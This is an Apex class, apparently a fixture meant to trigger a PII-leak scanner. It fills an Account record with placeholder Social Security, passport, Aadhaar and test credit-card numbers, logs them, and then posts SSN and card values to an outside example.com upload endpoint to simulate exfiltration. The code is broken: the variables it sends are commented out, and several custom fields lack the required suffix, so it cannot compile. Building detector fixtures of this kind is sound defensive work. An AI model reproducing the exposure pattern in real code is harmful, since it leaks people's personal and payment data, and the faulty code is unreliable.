public class TriggerPIIParameterTest {
    public void piiFieldTest() {
        Account acc = new Account();
        acc.Name = 'Jane Doe';                         // Sensitive
        acc.SSN = '123-45-6789';                    // Sensitive – SSN
        acc.Passport = 'M9876543';                  // Sensitive – Custom Field
        acc.Aadhaar__c = '1234-5678-9123';             // Sensitive – Custom ID
        acc.Email__c = 'jane.doe@example.com';         // Sensitive – Email
        acc.Phone__c = '+1-555-0199';                  // Sensitive – Phone Number
        acc.Social_Security_Number = '987-65-4321'; // Sensitive – Custom Field
        acc.Credit_Card = '4111111111111111';       // Sensitive – Custom Field
        insert acc;

        // Hardcoded sensitive literals for direct detection
        //String ssn = '123-45-6789';                    // Sensitive
        //String creditCard = '4111111111111111';        // Sensitive
        //String passport = 'M9876543';                  // Sensitive
        //String socialSecurity = '999-99-9999';         // Sensitive

        // Map with sensitive keys and values
        Map<String, String> piiMap = new Map<String, String>{
            'SSN' => ssn,
            'Credit_Card' => creditCard,
            'Passport' => passport,
            'Social_Security_Number' => socialSecurity
        };
        System.debug('PII Data: ' + piiMap);

        // Simulate data exposure
        HttpRequest req = new HttpRequest();
        req.setEndpoint('https://example.com/api/upload');
        req.setMethod('POST');
        req.setBody('SSN=' + ssn + '&Credit_Card=' + creditCard);
        Http http = new Http();
        HttpResponse res = http.send(req);
    }
}
